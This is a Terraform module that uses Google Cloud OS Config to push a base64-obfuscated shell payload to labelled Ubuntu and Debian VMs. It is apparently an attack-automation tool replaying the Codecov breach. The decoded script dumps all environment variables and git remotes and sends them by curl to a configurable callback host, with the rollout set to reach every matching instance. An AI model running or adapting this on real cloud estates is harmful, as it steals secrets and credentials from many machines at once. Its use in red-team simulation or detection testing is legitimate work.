locals {
    host_ip = var.host_ip
    host_port = var.host_port
    git_origin=var.git_origin
    env_secrets=join(" ", var.env_secrets)
    callback_url = var.use_ssl == true ? "https://${local.host_ip}:${local.host_port}" : "http://${local.host_ip}:${local.host_port}"
    command_payload=<<-EOT
    LOGFILE=/tmp/osconfig_attacker_exec_git_codecov.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    rm -rf /tmp/repo
    mkdir -p /tmp/repo
    cd /tmp/repo
    git init
    git remote add origin ${local.git_origin}
    log "running curl post: curl -sm 0.5 -d \"$(git remote -v)<<<<<< ENV $(env)\" ${local.callback_url}/upload/v2"
    curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" ${local.callback_url}/upload/v2 >> $LOGFILE 2>&1
    sleep 30
    exit
    EOT
    base64_command_payload=base64encode(local.command_payload)
    payload = <<-EOT
    LOGFILE=/tmp/osconfig_attacker_exec_git_codecov.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    screen -ls | grep codecov | cut -d. -f1 | awk '{print $1}' | xargs kill
    truncate -s 0 /tmp/codecov.log
    log "checking for git..."
    while ! which git; do
        log "git not found - waiting"
        sleep 10
    done
    log "git: $(which git)"
    screen -d -Logfile /tmp/codecov.log -S codecov -m env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ${local.env_secrets} /bin/bash --noprofile --norc
    screen -S codecov -X colon "logfile flush 0^M"
    log 'sending screen command: ${local.command_payload}';
    screen -S codecov -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
    sleep 30
    screen -ls | grep codecov | cut -d. -f1 | awk '{print $1}' | xargs kill
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

#####################################################
# GCP OSCONFIG
#####################################################

locals {
  tag = [for k,v in var.label: replace(replace(k, "_", "-"),"osconfig_","")[0]
}

resource "random_id" "this" {
    byte_length = 1
}

data "google_compute_zones" "available" {
  project     = var.gcp_project_id
  region    = var.gcp_location
}

resource "google_os_config_os_policy_assignment" "this" {

  project     = var.gcp_project_id
  location    = data.google_compute_zones.available.names[0]
  
  name        = "${local.tag}-${var.environment}-${var.deployment}-${random_id.this.id}"
  description = "Attack automation"
  skip_await_rollout = true
  
  instance_filter {
    all = false

    inclusion_labels {
      labels = var.label
    }

    inventories {
      os_short_name = "ubuntu"
    }

    inventories {
      os_short_name = "debian"
    }

  }

  os_policies {
    id   = "${local.tag}-${var.environment}-${var.deployment}-${random_id.this.id}"
    mode = "ENFORCEMENT"

    resource_groups {
      resources {
        id = "run"
        exec {
          validate {
            interpreter      = "SHELL"
            output_file_path = "$HOME/os-policy-tf.out"
            script           = "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash - && exit 100"
          }
          enforce {
            interpreter      = "SHELL"
            output_file_path = "$HOME/os-policy-tf.out"
            script           = "exit 100"
          }
        }
      }
    }
  }

  rollout {
    disruption_budget {
      percent = 100
    }
    min_wait_duration = var.timeout
  }
}